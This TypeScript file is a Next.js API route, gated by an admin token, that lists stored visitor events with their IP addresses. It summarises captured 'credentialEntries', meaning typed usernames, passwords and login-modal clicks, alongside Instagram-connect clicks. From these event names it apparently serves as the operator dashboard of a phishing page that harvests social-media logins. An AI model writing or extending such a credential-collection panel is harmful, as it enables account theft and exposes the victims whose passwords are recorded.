import { type NextRequest } from "next/server";
import { getStorage } from "@/lib/storage";
import { corsHeaders } from "@/lib/cors";

export async function OPTIONS(request: NextRequest) {
  return new Response(null, {
    status: 204,
    headers: corsHeaders(request),
  });
}

export async function GET(request: NextRequest) {
  const adminToken = process.env.ADMIN_TOKEN;
  const provided =
    request.headers.get("x-admin-token") ?? request.nextUrl.searchParams.get("token") ?? "";

  if (!adminToken) {
    return Response.json(
      { error: "ADMIN_TOKEN is not configured on this server" },
      { status: 500, headers: corsHeaders(request) }
    );
  }

  if (provided !== adminToken) {
    return Response.json(
      { error: "Unauthorized" },
      { status: 401, headers: corsHeaders(request) }
    );
  }

  try {
    const limit = Math.min(parseInt(request.nextUrl.searchParams.get("limit") ?? "100", 10), 1000);
    const storage = await getStorage();
    const events = await storage.list(limit);

    const summary = {
      total: events.length,
      credentialEntries: events.filter(
        (e) =>
          e.event === "modal_login_click" ||
          e.event === "input_username" ||
          e.event === "input_password" ||
          Boolean(e.metadata?.username || e.metadata?.password || e.metadata?.value)
      ).length,
      pageViews: events.filter((e) => e.event === "page_view").length,
      connectClicks: events.filter((e) => e.event === "connect_instagram_click").length,
      uniqueIps: new Set(events.map((e) => e.ip)).size,
    };

    return Response.json({ summary, events }, { headers: corsHeaders(request) });
  } catch (error) {
    console.error("[admin/visits] error:", error);
    return Response.json(
      { error: "Internal server error" },
      { status: 500, headers: corsHeaders(request) }
    );
  }
}
